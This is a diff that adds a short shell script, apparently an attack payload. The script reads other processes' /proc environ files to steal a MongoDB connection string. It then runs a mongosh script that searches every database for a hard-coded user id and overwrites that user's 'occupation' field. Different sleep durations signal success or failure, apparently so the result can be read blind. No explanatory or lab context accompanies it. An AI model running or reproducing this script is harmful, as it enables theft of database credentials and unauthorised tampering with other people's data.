@@ -1,0 +1,19 @@
+#!/bin/sh
+f=$(grep -al MONGODB_URI /proc/[0-9]*/environ 2>/dev/null | head -1)
+[ -n "$f" ] || { sleep 4; exit; }
+M=$(grep -ao 'MONGODB_URI=[^[:cntrl:]]*' "$f" | head -1 | cut -d= -f2-)
+[ -n "$M" ] || { sleep 8; exit; }
+cat >/tmp/m.js <<'EOF'
+const dbs = db.adminCommand({listDatabases:1}).databases;
+const q = {$or:[{id:10132653},{user_id:10132653},{userId:10132653},{player_id:10132653},{_id:10132653}]};
+for (const d of dbs) {
+  const x = db.getSiblingDB(d.name);
+  for (const c of x.getCollectionNames()) {
+    const doc = x.getCollection(c).findOne(q);
+    if (doc) { x.getCollection(c).updateOne({_id:doc._id},{$set:{occupation:'MK2HIT'}}); quit(0); }
+  }
+}
+quit(1);
+EOF
+mongosh "$M" --quiet --file /tmp/m.js >/tmp/o 2>/tmp/e
+if [ $? = 0 ]; then sleep 20; else sleep 12; fi
